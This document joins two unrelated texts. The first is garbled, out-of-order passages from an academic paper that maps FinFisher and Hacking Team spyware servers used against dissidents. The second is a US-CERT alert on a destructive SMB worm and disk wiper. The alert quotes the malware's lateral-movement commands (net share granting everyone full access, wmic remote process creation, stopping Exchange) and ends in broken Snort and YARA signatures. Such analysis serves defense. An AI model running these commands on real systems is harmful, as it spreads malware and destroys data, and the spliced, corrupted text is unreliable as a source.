pirically characterize the use of FinFisher and Hacking Team             our signatures.We located a version of FinSpy that does not
around the world, enabling us to assess their prevalence, and            use the normal FinSpy handshake, but instead uses a protocol
identify other country cases that may warrant future investiga-          based on HTTP POST requests for communication with the
tion.We analyzed the samples and the behavior of their C&C              C&C server.sion of the protocol, suggesting that our scan results may not                  Country            IPs             Provider           IPs
reveal the full scope of FinSpy C&C servers.Perhaps, the                     United States         61              Linode             42
HTTP POST protocol was only delivered to a specific Gamma                    United Kingdom         18            NOC4Hosts            16
customer to meet a requirement.sults containing the strings “DaVinci” and “RCS.” At the time,
several AV vendors had added detection for RCS based on a
sample analyzed by Dr.Web [71] and the UAE RCS sample                    ing one of our fingerprints in 29 different countries.We sum-
sent to Ahmed.tures that yielded 23 additional samples of structurally similar             In addition, we found: (1) 3 IP addresses on a /28 named
malware.“HT public subnet” that is registered to the CFO of Hacking
    Fingerprints: We probed the C&C servers of the RCS and                Team [76].The domain hackingteam.it resolves to an
FSBSpy samples, and found that they responded in a distinc-               address in this range.(2) An address belonging to Omantel, a
tive way to HTTP requests, and returned distinctive SSL cer-              majority-state-owned telecom in Oman.This address was un-
tificates.reachable when we probed it; a researcher pointed us to an FS-
                                                                          BSpy sample that contained an Arabic-language bait document
    We searched sources including Shodan, 5 Internet Census
                                                                          about Omani poetry, which talked to a C&C in the UK.(3) 7
service probes [73], and Critical.IO scanning data [68] for the
                                                                          IP addresses belonging to Maroc Telecom.Moroccan journal-
observed distinctive HTTP behavior.We searched for the dis-
                                                                          ists at Mamfakinch.com were previously targeted by RCS in
tinctive SSL certificates in two Internet Census service probes,
                                                                          2012 [77].(4) Overall, servers in 8 countries with governments
and SSL certificate scans from ZMap [74].We also contacted a
                                                                          deemed “authoritarian regimes” [69]: Azerbaijan, Kazakhstan,
team at TU Munich [75], who applied our fingerprints to their
                                                                          Nigeria, Oman, Saudi Arabia, Sudan, UAE, Uzbekistan.SSL scanning data.Across all of these sources, we obtained
                                                                             Link to Hacking Team: All active servers match-
31,345 indicator hits reflecting 555 IP addresses in 48 coun-
                                                                          ing one of our signatures also responded peculiarly when
tries.queried with particular ill-formed HTTP requests, respond-
    One SSL certificate returned by 175 of the servers was issued
                                                                          ing with “HTTP1/1 400 Bad request” (should be
by “/CN=RCS Certification Authority /O=HT srl,” apparently
                                                                          “HTTP/1.1”) and a body of “Detected error: HTTP
referring to the name of the spyware and the company.Servers
                                                                          code 400”.Googling for this response yielded a GitHub
for 5 of our FSBSpy samples and 2 of our RCS samples re-
                                                                          project em-http-server [78], a Ruby-based webserver.sponded with this type of certificate.The project’s author is listed as Alberto Ornaghi, a software
    Some servers returned these certificates in chains that in-
                                                                          architect at Hacking Team.We suspect that the Hacking Team
cluded another distinctive certificate.We found 175 distinct IP
                                                                          C&C server code may incorporate code from this project.addresses (including the C&C’s for 5 of our FSBSpy samples
                                                                             Links between servers: We identified many cases where
and 2 of our RCS samples) responded with this second type of
                                                                          several servers hosted by different providers, and in different
certificate.countries, returned identical SSL certificates matching our fin-
    We devised two more indicators: one that matched 125 IP
                                                                          gerprints.We also observed 30 active servers used a global
addresses, including 7 of our FSBSpy samples’ C&C’s, and
                                                                          IPID.Only one active server had neither a global IPID nor
one that matched 2 IP addresses, in Italy and Kazakhstan.Server locations: On 11/4/13 we probed all of the IP ad-                  8 19 of the 42 Linode servers were hosted in the USA, so the two

dresses that we collected, finding 166 active addresses match-            patterns of prevalence are mostly distinct.11
USENIX Association 	                                                                            23rd USENIX Security Symposium  521
an SSL certificate matching our fingerprints.We assessed                  ing 11 cases in which they appeared to be used in countries
whether servers returning SSL certificates were forwarding to              governed by “authoritarian regimes.”
the servers with global IPIDs by inducing bursts of traffic at the             We aim with this work to inspire additional research efforts
former and monitoring the IPID at the latter.For 11 servers,              addressing the difficult problem of how to adequately protect
we found that the server’s activity correlated to bursts sent to           individuals with very limited resources facing very powerful
other servers We grouped servers by the SSL certificates they              adversaries.Open questions include robust, practical detection
returned, and found that each group forwarded to only a sin-               of targeted attacks designed to exfiltrate data from a victim’s
gle server, except for one case where a group forwarded to two             computer, as well as detection of and defense against novel at-
different IPs (both in Morocco).We also found two groups                  tack vectors, like tampering with Internet connections to insert
that forwarded to the same address.There was a 1:1 mapping                malware.between the remaining 8 addresses and groups.We refer to a                    The task is highly challenging, but the potential stakes are
group along with the server(s) it forwards to as a server group.likewise very high.An opposition member, reflecting on gov-
We identified several server groups that may be associated with            ernment hacking in Libya, speculated as to why some users
victims or operators in a certain country.Some of these suggest           would execute files even while recognizing them as potentially
possible further investigation:                                            malicious [2]: “If we were vulnerable we couldn’t care less ...Turkey: We identified a group containing 20 servers in 9                we were desperate to get our voices out ...it was a matter of
countries.Two RCS and 5 FSBSpy samples from VirusTo-                      life or death ...it was just vital to get this information out.”
tal communicated with various servers in the group.The RCS
samples also communicated with domains with lapsed registra-
                                                                           Acknowledgment
tions, so we registered them to observe incoming traffic.We ex-
clusively received RCS traffic from Turkish IP addresses.(RCS             This work was supported by the National Science Foundation
traffic is identifiable based on a distinctive user agent and URL          under grants 1223717 and 1237265, and by a Citizen Lab Fel-
in POST requests.)A sample of FSBSpy apparently installed                 lowship.Any opinions, findings, and conclusions or recom-
from an exploit on a Turkish server talked to one of the servers           mendations expressed in this material are those of the authors
in this group.[79]                                                         and do not necessarily reflect the views of the sponsors.We also found server groups containing servers in Uzbek-                   The authors would like to thank the following individuals
istan and Kazakhstan; we found FSBSpy samples on Virus-                    for their help in various aspects of our analysis: Bernhard Am-
Total uploaded from these countries that communicated with                 man, Collin D. Anderson, Brandon Dixon, Zakir Durumeric,
servers in these groups.Eva Galperin, Claudio Guarnieri, Drew Hintz, Ralph Holz,
   In the above cases, save Turkey, the country we have identi-            Shane Huntley, Andrew Lyons, Mark Schloesser, and Nicholas
fied is classified as an “authoritarian regime,” and may be using          Weaver.Hacking Team products against the types of targets we profile
in this paper.In the case of Turkey, there are hints that the tool
may be employed against dissidents [80].References
                                                                            [1] “Dark Secrets—Hacking Team commercial,” ac-
                                                                                cessed:       12-November-2013.[Online].Available:
6    Summary
                                                                                http://bit.ly/1bCh57v
Targeted surveillance of individuals conducted by nation-states             [2] J. Scott-Railton, “Revolutionary Risks: Cyber Technol-
poses an exceptionally challenging security problem, given the                  ogy and Threats in the 2011 Libyan Revolution,” US
great imbalance of resources and expertise between the victims                  Naval War College, Tech.Rep., 2013.
and the attackers.We have sketched the nature of this problem              [3] S. H. AlJalahma, “Response to The Guardian—UK
space as reported to us by targeted individuals in three Middle                 companys software used against Bahrain activist,” May
Eastern countries.The attacks include spyware for ongoing                      2013, accessed: 12-November-2013.[Online].Available:
monitoring and the use of “IP spy” links to deanonymize those                   http://bit.ly/19iVUUP
who voice dissent.[4] V. Silver, “Gamma Says No Spyware Sold to
    The attacks, while sometimes incorporating effective so-                    Bahrain; May Be Stolen Copy,” Jul.2012, ac-
cial engineering, in general lack novel technical elements.In-                 cessed:     12-November-2013.[Online].Available:
stead, they employ prepackaged tools developed by vendors                       http://bloom.bg/17SOXQs
or acquired from the cybercrime underground.This technol-
                                                                            [5] A. Jeffries, “Meet Hacking Team, the company that helps
ogy sometimes suffers from what strike us as amateurish mis-
                                                                                the police hack you,” Sep. 2013, accessed: 12-November-
takes (multiple serious errors implementing cryptography, bro-
                                                                                2013.[Online].Available: http://bit.ly/1bCajyl
ken protocol messages), as does the attackers’ employment of
it (identifying-information embedded in binaries, C&C servers               [6] T. Brewster, “From Bahrain To Belarus: Attack Of The
discoverable via scanning or “Google hacking”, clusters of at-                  Fake Activists,” Jul.2013, accessed: 12-November-2013.tack accounts tied by common activity).Some of these errors                    [Online].Available: http://bit.ly/1gIgwhW
assisted our efforts to assemble strong circumstantial evidence             [7] V. Silver, “MJM as Personified Evil Says Spyware Saves
of governmental origins.In addition, we mapped out the global                  Lives Not Kills Them,” 2011, accessed: 12-November-
use of two “governmental” hacking suites, including identify-                   2013.[Online].Available: http://bloom.bg/170E8sQ


                                                                      12
522  23rd USENIX Security Symposium	                                                                                   USENIX Association
 [8] D. Gilbert, “Hacking Team and the Murky World of                 [27] “FinFisher - Excellence in IT Investigation,” ac-
     State-Sponsored Spying,” 2013, accessed: 12-November-                 cessed:      27-February-2014.[Online].Available:
     2013.[Online].Available: http://bit.ly/17tBBtm                      http://www.finfisher.com/
 [9] R. Clayton, S. J. Murdoch, and R. N. Watson, “Ignoring           [28] R. Rolles, “Unpacking virtualization obfuscators,” in
     the Great Firewall of China,” in PETS.Springer, 2006,                USENIX WOOT, 2009.
     pp.20–35.[29] “TEMU: The BitBlaze Dynamic Analysis Compo-
[10] J. R. Crandall et al., “ConceptDoppler: A Weather                     nent,” accessed: 7-August-2013.[Online].Available:
     Tracker for Internet Censorship,” in ACM CCS, 2007.                   http://bit.ly/1clcxSZ
[11] X. Xu, Z. M. Mao, and J.A. Halderman, “Internet Cen-            [30] “‘Reinstate sacked official’       call,”   2013,   ac-
     sorship in China: Where Does the Filtering Occur?” in                 cessed:       11-November-2013.[Online].Available:
     Proc.PAM, 2011.                                                      http://bit.ly/1aRUZ4b
[12] M. Sherr, G. Shah, E. Cronin, S. Clark, and M. Blaze,            [31] “Unionist Questioned,” 2013, accessed: 23-April-2013.“Can They Hear Me Now?A Security Analysis of Law                     [Online].Available: http://bit.ly/1gHnBiS
     Enforcement Wiretaps,” in ACM CCS, 2009, pp.512–                [32] N. Villeneuve, “Fake Skype Encryption Service Cloaks
     523.DarkComet Trojan,” Apr.2012, accessed: 4-August-
[13] J. R. Crandall, M. Crete-Nishihata, and J. Knockel, “Chat             2013.[Online].Available: http://bit.ly/17SpA1c
     program censorship and surveillance in China: Tracking           [33] E. Galperin and M. Marquis-Boire, “Fake YouTube
     TOM-Skype and Sina UC,” First Monday, vol.18, no.7,                 Site Targets Syrian Activists With Malware,” Mar.Jul.2013, accessed: 8-August-2013.[Online].Available:              2012, accessed: 4-August-2013.[Online].Available:
     http://bit.ly/1fzNcHl                                                 http://bit.ly/HSCRet
[14] S. Wolchok, R. Yao, and J.A. Halderman, “Analysis of            [34] ——, “New Wave of Facebook Phishing Attacks Targets
     the Green Dam Censorware System,” Tech.Rep., 2009.Syrian Activists,” Apr.2012, accessed: 4-August-2013.[15] F. Li, A. Lai, and D. Ddl, “Evidence of Advanced Persis-              [Online].Available: http://bit.ly/1hDQsG8
     tent Threat: A case study of malware for political espi-         [35] ——, “Pro-Syrian Government Hackers Target Activists
     onage,” in MALWARE, 2011.With Fake Anti-Hacking Tool,” Aug. 2012, accessed:
[16] “Default https access for Gmail,” 2010, accessed: 7-                  4-August-2013.[Online].Available: http://bit.ly/1eJj12T
     August-2013.[Online].Available: http://bit.ly/1bBktPM          [36] J. Scott-Railton and M. Marquis-Boire, “A Call to Harm:
[17] “Making Twitter more secure: HTTPS,” 2011, accessed:                  New Malware Attacks Target the Syrian Opposition,”
     7-August-2013.[Online].Available: http://bit.ly/1i7l9kM             Citizen Lab, Tech.Rep., Jun.2013, accessed: 3-August-
                                                                           2013.[Online].Available: http://bit.ly/1a2l9PK
[18] L. Constantin, “Facebook to roll out HTTPS by default
     to all users,” 2012, accessed: 7-August-2013.[Online].[37] E. Galperin and M. Marquis-Boire, “Trojan Hidden
     Available: http://bit.ly/1bsLBCm                                      in Fake Revolutionary Documents Targets Syrian Ac-
                                                                           tivists,” May 2012, accessed: 4-August-2013.[Online].[19] “FinFisher: Governmental IT Intrusion and Remote
                                                                           Available: http://bit.ly/1cSJT0
     Monitoring Solutions,” accessed: 12-November-2013.[Online].Available: http://bit.ly/1840Lxn                       [38] M. Marquis-Boire and S. Hardy, “Syrian Activists Tar-
                                                                           geted with BlackShades Spy Software,” Jun.2012,
[20] “BlackBerry rogue software leaves sour taste in UAE,”
                                                                           accessed:      12-November-2013.[Online].Available:
     2013, accessed: 11-November-2013.[Online].Available:
                                                                           http://bit.ly/1a2l6mX
     http://on.ft.com/HVXvJP
                                                                      [39] S. Fagerland, “The Syrian Spyware,” Feb. 2012,
[21] Mandiant, “The Advanced Persistent Threat,” 2010.
                                                                           accessed:       4-August-2013.[Online].Available:
[22] ——, “APT1: Exposing One of China’s Cyber Espionage                    http://bit.ly/HLyGR9
     Units,” 2013.[40] Telecomix, “REPORT of a Syrian spyware,” p. 9, Feb.
[23] S. Fagerland, M. Krakvik, J.Camp, and N. Moran, “Op-                 2012, accessed: 4-August-2013.[Online].Available:
     eration Hangover: Unveiling an Indian Cyberattack In-                 http://bit.ly/1bsNcIk
     frastructure,” 2013.[41] S. Faris, “The Hackers of Damascus,” Nov.
[24] R. Deibert and R. Rohozinski, “Tracking GhostNet: In-                 2012, accessed: 9-August-2013.[Online].Available:
     vestigating a Cyber Espionage Network,” Information                   http://buswk.co/17t8RRH
     Warfare Monitor, p. 6, 2009.[42] L. Aylward, “Malware Analysis—Dark Comet RAT,”
[25] S. Nagaraja and R. Anderson, “The snooping dragon:                    Nov. 2011, accessed: 4-August-2013.[Online].Avail-
     social-malware surveillance of the Tibetan movement,”                 able: http://bit.ly/16ZXgag
     Tech.Rep., 2009.[43] Quequero, “DarkComet Analysis—Understanding the
[26] F. C. Solutions, ““njRAT” Uncovered,” 2013, accessed:                 Trojan used in Syrian Uprising,” Mar.2012, accessed:
     25-June-2013.[Online].Available: http://bit.ly/1eJheel              4-August-2013.[Online].Available: http://bit.ly/19i6kEl


                                                                 13
USENIX Association 	                                                                      23rd USENIX Security Symposium  523
[44] S. Denbow and J. Hertz, “Pest Control: Taming the               [63] “Ultimate       Packer        for    eXecutables,”     ac-
     RATs,” p. 14, accessed: 12-November-2013.[Online].cessed:        27-February-2014.[Online].Available:
     Available: http://bit.ly/1fzLA0m                                     http://upx.sourceforge.net/
[45] B. Brumfield, “Computer spyware is newest weapon in             [64] “CVE-2013-0422,” accessed: 27-February-2014.[On-
     Syrian conflict,” Feb. 2012, accessed: 4-August-2013.line].Available: http://bit.ly/NA1O0A
     [Online].Available: http://cnn.it/HLz5TA                       [65] njq8, “New java drive-by 2013-1-11,” 2013, accessed:
[46] “jalnosra.com,” accessed: 27-February-2014.[Online].27-February-2014.[Online].Available: http://www.dev-
     Available: jalnosra.com                                              point.com/vb/t357796.html
[47] “Skype Encryption.wmv,” accessed: 27-February-2014.[66] “Appin Technology Lab,” accessed: 27-February-2014.[Online].Available: http://bit.ly/HZ3e1y                            [Online].Available: http://www.appinonline.com/
[48] E. Galperin and M. Marquis-Boire, “The Internet                 [67] C. Guarnieri, “Analysis of the FinFisher Lawful
     is Back in Syria and So is Malware Targeting                         Interception Malware,” 2012, accessed: 7-August-2013.Syrian Activists,” Dec. 2012, accessed: 4-August-2013.[Online].Available: http://bit.ly/1eJjVMV
     [Online].Available: http://bit.ly/1bngqFc                      [68] H. Moore, “Critical Research: Internet Security Survey,”
[49] “Free Syrian Army Sex Tape—Abdul Razzaq Tlass                        2012.[NSFW],” accessed: 5-August-2013.[Online].Available:          [69] “Democracy Index 2012: Democracy at a Standstill,”
     http://bit.ly/1gHqDDH                                                2012, accessed: 7-August-2013.[Online].Available:
[50] A. Lund, “Holy Warriors: A field guide to Syria’s jihadi             http://bit.ly/HSEDMD
     groups,” Oct. 2012, accessed: 5-August-2013.[Online].[70] “YARA - The pattern matching swiss knife for malware
     Available: http://atfp.co/17t8yq5                                    researchers,” accessed: 27-February-2014.[Online].Available: http://plusvic.github.io/yara/
[51] “Ahmed Mansoor and Four Other Pro-Democracy
     Activists Pardoned and Freed,”           2013,   ac-            [71] “Cross-platform Trojan controls Windows and Mac
     cessed:       10-November-2013.[Online].Available:                 machines,” 2012, accessed: 7-August-2013.[Online].http://bit.ly/18pHpis                                                Available: http://bit.ly/1eJnJgZ
[52] “Royal Group,” accessed: 27-February-2014.[Online].[72] S. Golovanov, “Adobe Flash Player 0-day and Hack-
     Available: http://www.royalgroupuae.com/                             ingTeam’s Remote Control System,” 2013, accessed:
                                                                          7-August-2013.[Online].Available: http://bit.ly/17n12ro
[53] T. Katsuki, “Crisis for Windows Sneaks onto Virtual
     Machines,” 2012, accessed: 27-February-2014.[Online].[73] “Internet Census 2012,” 2013, accessed: 7-August-2013.Available: http://bit.ly/MzheRJ                                      [Online].Available: http://bit.ly/1i7rRHs
                                                                     [74] Z. Durumeric, E. Wustrow, and J.A. Halderman, “ZMap:
[54] “Hacking Team,” accessed: 27-February-2014.[Online].Fast Internet-Wide Scanning and its Security Applica-
     Available: http://www.hackingteam.it/
                                                                          tions,” in USENIX Security, Aug. 2013.[55] “MPRESS,” accessed: 27-February-2014.[Online].[75] “Home of Crossbear and OONIBear,”                      ac-
     Available: http://www.matcode.com/mpress.htm
                                                                          cessed:        27-February-2014.[Online].Available:
[56] “Sign in using application-specific passwords,”                      https://pki.net.in.tum.de/
     accessed:     27-February-2014.[Online].Available:
                                                                     [76] “RIPE Database Query for FASTWEB-HT,” ac-
     https://support.google.com/accounts/answer/185833?hl=en
                                                                          cessed:        27-February-2014.[Online].Available:
[57] S. Fagerland, “Systematic cyber attacks against Is-                  http://bit.ly/MzkigV
     raeli and Palestinian targets going on for a year,”             [77] “How Government-Grade Spy Tech Used A Fake Scandal
     2012, accessed: 12-November-2013.[Online].Available:               To Dupe Journalists,” 2012, accessed: 7-August-2013.http://bit.ly/1aSdw07
                                                                     [78] A. Ornaghi, “em-http-server,” accessed: 27-February-
[58] V. Silver, “Spyware Leaves Trail to Beaten                           2014.[Online].Available: https://github.com/alor/em-
     Activist Through Microsoft Flaw,” 2012, ac-                          http-server
     cessed:     14-November-2013.[Online].Available:
                                                                     [79] SophosLabs, “Anatomy of a targeted attack—
     http://bloom.bg/1ja2geI
                                                                          SophosLabs explores an Adobe zero-day “malware
[59] B. Hubbard, “Emirates Balk at Activism in Region                     experiment”,” 2013, accessed 7-August-2013.[Online].Hit by Uprisings,” 2013, accessed: 14-November-2013.Available: http://bit.ly/HQ1oRc
     [Online].Available: http://nyti.ms/I4n2Aw
                                                                     [80] K. Zetter, “American Gets Targeted by Digital
[60] “SPY NET,” accessed: 27-February-2014.[Online].Spy Tool Sold to Foreign Governments,” 2013,
     Available: http://newspynetrat.blogspot.com/                         accessed:      14-November-2013.[Online].Available:
[61] “Asprotect SKE,” accessed: 27-February-2014.[Online].http://wrd.cm/1fHonth
     Available: http://www.aspack.com/asprotect32.html               [81] M. Marquis-Boire and B. Marczak, “From Bahrain
[62] “Unpacking VBInject/VBCrypt/RunPE,” 2010, ac-                        With Love: FinFisher’s Spy Kit Exposed?”              Jul.cessed:         7-August-2013.[Online].Available:                  2012, accessed: 4-August-2013.[Online].Guarnieri searched a database of
such responses compiled by the Critical.IO Internet scanning
project [68], locating 11 additional servers in 10 countries [67].We refer to this fingerprint as α1 .Concurrent with this ef-
fort, we devised our own fingerprint β1 that tested three as-
pects of the handshake between a FinSpy infectee and a Fin-
Spy C&C server, which follows a custom TLV-based protocol
running on ports such as 22, 53, 80, and 443.We conducted
targeted scanning of several countries using β1 , and also con-
firmed Guarnieri’s findings for those servers still reachable af-
ter he published his findings.We observed a trend: changes in HTTP response behavior
by FinFisher after publication of findings about the software.In July 2012, for example, after a post about Bahraini FinSpy
samples [81], servers closed the TCP connection in response
to a GET / or HEAD / request (although servers continued
to behave consistently with β1 .Other changes followed later
in 2012, including a new response to GET / requests that in-
cluded an imperfect copy of an Apache server’s HTTP response
(the Date header used UTC rather than GMT).We fingerprinted
this error as α2 , and later in 2012 fingerprinted other distinctive
behavior in response to GET / requests as α3 .Subsequent scans of /0 for α2 and α3 , and five service
probes of the Internet Census for α1 through α3 , located several
additional servers.In Feburary 2013 we identified and finger-
printed new HTTP response behavior with α4 and modified β1
to produce β2 , which tests only two of the three aspects of the
FinSpy handshake (the third test of β1 was broken when Fin-
Spy servers were updated to accept types of invalid data they
had previously rejected).As of 3/13/13, all servers that matched any α fingerprint
matched β2 .15
USENIX Association 	                                                        23rd USENIX Security Symposium  525Alert (TA14-353A)
Targeted Destructive Malware
Original release date: December 19, 2014



Systems Affected
Microsoft Windows

Overview
US-CERT was recently notified by a trusted third party of cyber threat actors using a Server Message Block (SMB) Worm Tool to conduct cyber exploitation
activities recently targeting a major entertainment company.This SMB Worm Tool is equipped with a Listening Implant, Lightweight Backdoor, Proxy Tool,
Destructive Hard Drive Tool, and Destructive Target Cleaning Tool.SMB Worm Tool: This worm uses a brute force authentication attack to propagate via Windows SMB shares.It connects home every five minutes to send log data
back to command and control (C2) infrastructure if it has successfully spread to other Windows hosts via SMB port 445.The tool also accepts new scan tasking
when it connects to C2.There are two main threads: the first thread calls home and sends back logs (a list of successful SMB exploitations), and the second thread
attempts to guess passwords for SMB connections.If the password is correctly guessed, a file share is established and file is copied and run on the newly-infected
host.Listening Implant: During installation of this tool, a portion of the binaries is decrypted using AES, with a key derived from the phrase "National Football League."Additionally, this implant listens for connections on TCP port 195 (for "sensvc.exe" and "msensvc.exe") and TCP port 444 (for "netcfg.dll").Each message sent to
and from this implant is preceded with its length, then XOR encoded with the byte 0x1F.Upon initial connection, the victim sends the string, "HTTP/1.1 GET /dns?\x00."The controller then responds with the string "200 www.yahoo.com!\x00" (for "sensvc.exe" and "msensvc.exe") or with the string "RESPONSE 200 OK!!"(for
"netcfg.dll").The controller sends the byte "!"(0x21) to end the network connection.This special message is not preceded with a length or XOR encoded.Lightweight Backdoor: This is a backdoor listener that is designed as a service DLL.It includes functionality such as file transfer, system survey, process
manipulation, file time matching and proxy capability.The listener can also perform arbitrary code execution and execute commands on the command line.This
tool includes functionality to open ports in a victim host's firewall and take advantage of universal Plug and Play (UPNP) mechanisms to discover routers and
gateway devices, and add port mappings, allowing inbound connections to victim hosts on Network Address Translated (NAT) private networks.There are no
callback domains associated with this malware since connections are inbound only on a specified port number.Proxy Tool: Implants in this malware family are typically loaded via a dropper installed as a service, then configured to listen on TCP port 443.The implant may
have an associated configuration file which can contain a configurable port.This proxy tool has basic backdoor functionality, including the ability to fingerprint the
victim machine, run remote commands, perform directory listings, perform process listings, and transfer files.Destructive Hard Drive Tool: This tool is a tailored hard-drive wiping tool that is intended to destroy data past the point of recovery and to complicate the victim
machine’s recovery.If the CNE operator has administrator-level privileges on the host, the program will over-write portions of up-to the first four physical drives
attached, and over-write the master boot record (MBR) with a program designed to cause further damage if the hard drive is re-booted.This further results in the
victim machine being non-operational with irrecoverable data (There is a caveat for machines installed with the windows 7 operating system: windows 7 machines
will continue to operate in a degraded state with the targeted files destroyed until after reboot, in which the infected MBR then wipes the drive.)If the actor has
user-level access, the result includes specific files being deleted and practically irrecoverable, but the victim machine would remain usable.Destructive Target Cleaning Tool: This tool renders victim machines inoperable by overwriting the Master Boot Record.The tool is dropped and installed by another
executable and consists of three parts: an executable and a dll which contain the destructive components, and an encoded command file that contains the actual
destruction commands to be executed.Network Propagation Wiper: The malware has the ability to propagate throughout the target network via built-in Windows shares.Based on the
username/password provided in the configuration file and the hostname/IP address of target systems, the malware will access remote network shares in order to
upload a copy of the wiper and begin the wiping process on these remote systems.The malware uses several methods to access shares on the remote systems to
begin wiping files.Checking for existing shares via “\\hostname\admin$\system32” and “\\hostname\shared$\system32” or create a new share “cmd.exe /q /c net
share shared$=%SystemRoot% /GRANT:everyone, FULL”.Once successful, the malware uploads a copy of the wiper file “taskhostXX.exe”, changes the file-time
to match that of the built-in file “calc.exe”, and starts the remote process.The remote process is started via the command “cmd.exe /c wmic.exe /node:hostname
/user:username /password:pass PROCESS CALL CREATE”.Hostname, username, and password are then obtained from the configuration file.Afterwards, the
remote network share is removed via “cmd.exe /q /c net share shared$ /delete”.Once the wiper has been uploaded, the malware reports its status back to one of
the four C2 IP addresses.Technical and strategic mitigation recommendations are included in the Solution section below.US-CERT recommends reviewing the Security Tip Handling Destructive Malware #ST13-003.Description
Cyber threat actors are using an SMB worm to conduct cyber exploitation activities.This tool contains five components – a listening implant, lightweight backdoor,
proxy tool, destructive hard drive tool, and destructive target cleaning tool.The SMB worm propagates throughout an infected network via brute-force authentication attacks, and connects to a C2 infrastructure.Impact
Due to the highly destructive functionality of this malware, an organization infected could experience operational impacts including loss of intellectual property and
disruption of critical systems.Solution
Users and administrators are recommended to take the following preventive measures to protect their computer networks:

      Use and maintain anti-virus software – Anti-virus software recognizes and protects your computer against most known viruses.It is important to keep your
      anti-virus software up-to-date (see Understanding Anti-Virus Software for more information).Keep your operating system and application software up-to-date – Install software patches so that attackers can't take advantage of known problems or
      vulnerabilities.Many operating systems offer automatic updates.If this option is available, you should enable it (see Understanding Patches for more
      information).Review Security Tip Handling Destructive Malware #ST13-003 and evaluate their capabilities encompassing planning, preparation, detection, and response
      for such an event.Review Recommended Practices for Control Systems, and Improving Industrial Control Systems Cybersecurity with Defense-in-Depth Strategies (pdf).The following is a list of the Indicators of Compromise (IOCs) that can be added to network security solutions to determine whether they are present on a network.This file serves as a dropper.It drops destructive malware: “igfxtrayex.exe”.When the dropper file was executed, it started a second instance of itself with “-i” as an argument, and then terminated.The second instance of the dropper file
installed itself as the “WinsSchMgmt” service with “-k” as a command line argument, started the service, and then terminated.The “WinsSchMgmt” service
executed the file with “-k” as an argument, which started another instance of the file using “-s” as an argument.The “-s” instance dropped and executed
“igfxtrayex.exe”, created “net_ver.dat”, and began generating network traffic over TCP ports 445 and 139 to victim IP addresses.Name: net_ver.dat

Size: 4572 bytes (4.6 KB) (size will vary)

MD5: 93BC819011B2B3DA8487F964F29EB934 (hash will vary)



This is a log file created by the dropper, and appended to as the scans progress It contains what appear to be hostnames, IP addresses, and the number 2.Entries in the file have the structure “HOSTNAME | IP Address | 2”.Name: igfxtrayex.exe
Size: 249856 bytes (249.9 KB)

MD5: 760C35A80D758F032D02CF4DB12D3E55

PE Compile Time: 2014-11-24 04:11:08



This file is destructive malware: a disk wiper with network beacon capabilities.If “igfxtrayex.exe” is run with no parameters, it creates and starts a copy of itself with
the “–i” argument.After 10 minutes, the “igfxtrayex.exe” makes three copies of itself and places them in the same directory from which it was executed.These
copies are named according to the format “taskhostXX.exe” (where X is a randomly generated ASCII character).These copies are then executed, each with a
different argument (one being “-m”, one being “-d” and the other “-w”).Network connection attempts are made to one of three hard-coded IP addresses in a random
order to port 8080 or 8000.If a connection to the IP address cannot be made, it attempts to connect to another of the three IP addresses, until connections to all
three IP addresses have been attempted.The following command-line string is then executed: “cmd.exe /c net stop MSExchangeIS /y”.A 120-minute (2 hour)
sleep command is issued after which the computer is shut down and rebooted.Name: iissvr.exe

Size: 114688 bytes (114.7 KB)

MD5: E1864A55D5CCB76AF4BF7A0AE16279BA

PE Compile Time: 2014-11-13 02:05:35



This file, when executed, starts a listener on localhost port 80.It has 3 files contained in the resource section; all xor’d with 0x63.Name: usbdrv3_32bit.sys

Size: 24280 bytes (24.3 KB)

MD5: 6AEAC618E29980B69721158044C2E544

PE Compile Time: 2009-08-21 06:05:32



This SYS file is a commercially available tool that allows read/write access to files and raw disk sectors for user mode applications in Windows 2000, XP, 2003,
Vista, 2008 (32-bit).It is dropped from resource ID 0x81 of “igfxtrayex.exe”.Name: usbdrv3_64bit.sys

Size: 28120 bytes (28.1 KB)

MD5: 86E212B7FC20FC406C692400294073FF

PE Compile Time: 2009-08-21 06:05:35



This SYS file is a also a commercially available tool that allows read/write access to files and raw disk sectors for user mode applications in Windows 2000, XP,
2003, Vista, 2008 (64-bit).It is dropped from resource ID 0x83 of “igfxtrayex.exe”.";nocase;sid:5;)



Proxy Tool:

alert tcp any any -> any any (msg:"Wiper1";content:"|8A 10 80 C2 3A 80 F2 73 88 10|";content:"|8A 10 80 F2 73 80 EA 3A 88 10|";sid:4;)

alert tcp any any -> any any (msg:"Wiper2";content:!4E 80 ??79 88 10}

$STR2 = {SA 10 80??79 80 ????????3B C6 89 44 24 1C OF 84 (D8 | d9) 01 00 00 33 FF 68 00 00 01 00 57 FF
15 ????????8B D8 3B DF 89 5C 24 14 OF 84 (BC | BD) 01 00 00 8B 44 24 1C A8 01 74 0A 24 FE 50 55 FF 15 ????????8B 44 24 4C 2B C7 74 20 48 74 0F
83 E8 02 75 1C C7 44 24 10 03 00 00 00 EB 12 C7 44 24 10 01 00 00 00 89 74 24 28 EB 04 89 7C 24 10 8B 44 24 10 89 7C 24 1C 3B C7 OF 8E ( 5C | 5d ) 01 00
00 8D 44 24 28 89 44 24 4C EB 03 83 CE FF 8B 4C 24 4C 8B 01 3B C6 74 17 8A D0 B9 00 40 00 00 8A F2 8B FB 8B C2 C1 E0 10 66 8B C2 F3 AB EB ( 13 | 14)
33 F6 (E8 | ff 15) ????????88 04 1E 46 81 FE 00 00 01 00 7C ( EF | ee) 6A 00 6A 00 6A 03 6A 00 6A 03 68 00 00 00 C0 55 FF 15 ????????8B F0 83 FE FF
OF 84 FA 00 00 00 8D 44 24 20 50 56 FF 15 ????????8B 2D ????????6A 02 6A 00 6A FF 56 FF D5 8D 4C 24 18 6A 00 51 6A 01 53 56 FF 15 ????????56 FF 15 ????????6A 00 6A 00 6A 00 56 FF D5 8B 44 24 24 8B 54 24 20 33 FF 33 DB 85 CO 7C 5A 7F 0A 85 D2 76 54 EB 04 8B 54 24 20 8B CA BD 00 00
01 00 2B CF 1B C3 85 C0 7F 0A 7C 04 3B CD 73 04 2B D7 8B EA 8B 44 24 14 8D 54 24 18 6A 00 52 55 50 56 FF 15 ????????8B 6C 24 18 8B 44 24 24 03
FD 83 D3 00 3B D8 7C BE 7F 08 8B 54 24 20 3B FA 72 B8 8B 2D ????????8B 5C 24 10 8B 7C 24 1C 8D 4B FF 3B F9 75 17 56 FF 15 ????????6A 00 6A
00 6A 00 56 FF D5 56 FF 15 ????????56 FF 15 ????????56 FF 15 ????????8B 4C 24 4C 8B 6C 24 48 47 83 C1 04 3B FB 8B 5C 24 14 89 7C 24 1C 89
